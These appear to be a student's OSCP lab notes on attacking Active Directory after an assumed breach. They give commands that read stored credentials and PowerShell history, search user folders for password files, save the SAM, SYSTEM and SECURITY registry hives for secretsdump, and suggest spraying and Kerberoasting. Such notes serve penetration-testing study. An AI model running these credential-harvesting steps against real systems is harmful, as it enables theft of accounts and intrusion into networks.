
in an assumed breach where you are given a set of credentials


example:
-u olivia
-p password

try 

cmdkey /list

PowerShell history 
type C:\Users\olivia\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

search the whole `Users` directory for any `.txt` or `.xml` files that might contain history or credentials

Get-ChildItem -Path C:\Users\olivia\ -Filter *history* -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\olivia\ -Filter *pass* -Recurse -ErrorAction SilentlyContinue

nxc ldap
nxc smb
nxc winrm
nxc rdp

if you can winrm or RDP in,

check privileges of your initial account using

whoami /all 
whoami /priv
net user olivia /domain


---

Check olivia's own folders and the root of C: for scripts, passwords, or web configurations

dir C:\Users\olivia\Desktop
dir C:\Users\olivia\Downloads
dir C:\

---



### "Manual" Escalation 

If you find that Olivia has **SeBackupPrivilege** or **SeRestorePrivilege** (check this using `whoami /priv`), you can bypass the `secretsdump` error by manually saving the registry hives:

PowerShell

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

Then download those files to your Kali machine and run `secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`.

-----

 don’t overcomplicate AD and don’t jump tools again and again.

See these are few things that actually worked for me:

- Start with creds you already have, no need to overthink entry
    
- Before running winPEAS, check simple stuff like cmdkey /list and PowerShell history
    
- Once you get SYSTEM, dump SAM and start spraying
    
- Run BloodHound early and actually read it properly
    
- Always try Kerberoasting if possible

[https://medium.com/bugbountywriteup/how-i-attacked-active-directory-during-oscp-labs-and-what-tools-actually-worked-8a10e12930a4?sk=882109dadee451db8d94ebb665019514](https://medium.com/bugbountywriteup/how-i-attacked-active-directory-during-oscp-labs-and-what-tools-actually-worked-8a10e12930a4?sk=882109dadee451db8d94ebb665019514)